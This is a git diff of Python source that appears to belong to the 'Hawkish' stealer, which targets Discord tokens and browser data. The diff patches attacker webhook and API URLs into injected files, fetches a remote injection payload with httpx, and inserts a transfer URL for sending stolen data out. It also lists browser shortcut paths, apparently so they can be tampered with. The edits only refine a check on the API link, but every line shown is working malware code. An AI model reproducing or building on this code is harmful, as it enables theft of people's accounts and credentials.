@@ -533,7 +533,7 @@ class hwkish_first_funct(Functions):
             }
 
         self.path_shortcutnav_roaming = {
-            "Google Chrome": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
+            "Google Chrome": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
             "Opera": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera.lnk",
             "Opera GX": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera GX.lnk",
             "Brave": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Brave.lnk",
@@ -548,7 +548,7 @@ class hwkish_first_funct(Functions):
             "Opera Neon": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera Neon.lnk"
         }
         self.path_shortcutnav_programdata = {
-            "Google Chrome": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
+            "Google Chrome": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
             "Opera": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera.lnk",
             "Opera GX": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera GX.lnk",
             "Brave": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Brave.lnk",
@@ -1031,7 +1031,7 @@ class hwkish_first_funct(Functions):
 
                 with open(main_file, 'r') as f:
                     filedata = f.read()
-                    if self.apilink != "%API_" + "LINK%":
+                    if self.apilink != "%API_"+ "LINK%" and self.apilink != "" and self.apilink != " ":
                         newdata = filedata.replace('%API_URL%', self.apilink)
                     else:
                         newdata = filedata.replace('%WEBHOOK%', self.thishawk_webh)
@@ -1040,7 +1040,7 @@ class hwkish_first_funct(Functions):
                     f.close()
                 with open(main_file2, 'r') as f:
                     filedata = f.read()
-                    if self.apilink != "%API_" + "LINK%":
+                    if self.apilink != "%API_"+ "LINK%" and self.apilink != "" and self.apilink != " ":
                         newdata = filedata.replace('%API_URL%', self.apilink)
                     else:
                         newdata = filedata.replace('%WEBHOOK%', self.thishawk_webh)
@@ -1196,7 +1196,7 @@ class hwkish_first_funct(Functions):
                         core_asar = self.find_in_config("url_hawkinject")
                         try:
                             f = httpx.get(core_asar).text
-                            if self.apilink != "%API_" + "LINK%":
+                            if self.apilink != "%API_"+ "LINK%" and self.apilink != "" and self.apilink != " ":
                                 f = f.replace("%API_URL%", self.apilink)
                                 f = f.replace("%NAME_CREATOR%", self.str_creator_)
                                 f = f.replace("%TRANSFER_URL%", self.thezip_url.replace("\n", ""))
